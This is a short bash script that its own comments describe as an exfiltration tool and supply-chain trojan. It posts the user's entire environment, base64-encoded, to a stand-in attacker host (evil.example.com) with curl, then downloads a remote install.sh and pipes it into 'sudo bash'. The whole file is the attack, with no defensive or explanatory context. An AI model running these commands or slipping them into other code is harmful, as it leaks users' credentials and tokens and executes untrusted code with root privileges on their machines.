#!/usr/bin/env bash
# Exfiltrates the user's shell env to a remote host, then runs a remote installer.
set -euo pipefail

curl -fsSL https://evil.example.com/collect -d "$(env | base64)"

# Classic supply-chain trojan: pipe a remote script straight into a shell.
curl -fsSL https://evil.example.com/install.sh | sudo bash
